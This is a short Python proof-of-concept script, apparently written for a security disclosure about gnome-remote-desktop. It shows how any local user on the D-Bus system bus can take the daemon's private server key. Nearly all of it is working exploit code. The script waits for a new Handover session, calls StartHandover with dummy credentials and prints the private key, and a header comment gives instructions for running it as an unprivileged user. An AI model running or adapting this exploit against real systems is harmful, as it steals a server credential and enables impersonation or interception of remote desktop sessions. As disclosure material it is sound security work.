#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner@suse.com>
# Date: 2024-04-19

# This script is a simple demonstration of how any local user with access to
# the D-Bus system bus can obtain the private key of the gnome-remote-desktop
# system daemon.
#
# For this the script monitors the creation of new Handovers sessions on the
# g-r-d D-Bus service, and then invokes the StartHandover method with
# arbitrary parameters to obtain the public certificate and private key.
#
# You can run it e.g. as the `nobody` user:
#
#     root# sudo -u nobody -g nobody /bin/bash
#     nobody$ /path/to/wait_for_grd_priv_key.py
#
# On success the private server key will be printed to stdout.


import subprocess

monitor = subprocess.Popen("gdbus monitor -y -d org.gnome.RemoteDesktop -o /org/gnome/RemoteDesktop/Rdp/Handovers".split(), stdout=subprocess.PIPE)

while True:
    line = monitor.stdout.readline()
    if line is None:
        print("monitor EOF encountered?")
        sys.exit(1)
    line = line.decode()
    # we are looking for a new object Handovers/sessionc<integer>
    idx = line.find("sessionc")
    if idx == -1:
        continue

    line = line[idx:]
    # extract the string up to the quote, this makes up the sessionc<integer>
    # object name we need
    idx = line.find("'")
    if idx == -1:
        continue
    line = line[:idx]
    session = line
    print("found session", session)
    break

monitor.terminate()
monitor.wait()

# now invoke the StartHandover method on the newly available session
out = subprocess.check_output(f"gdbus call -y -d org.gnome.RemoteDesktop -o /org/gnome/RemoteDesktop/Rdp/Handovers/{session} -m org.gnome.RemoteDesktop.Rdp.Handover.StartHandover someuser somepass".split())
out = out.decode()

idx = out.find("-----BEGIN PRIVATE KEY-----")

if idx == -1:
    print("unexpected StartHandover result:", out.decode())
    sys.exit(1)

cert = out[idx:].strip().strip("()'")
print(cert.replace('\\n', '\n'))
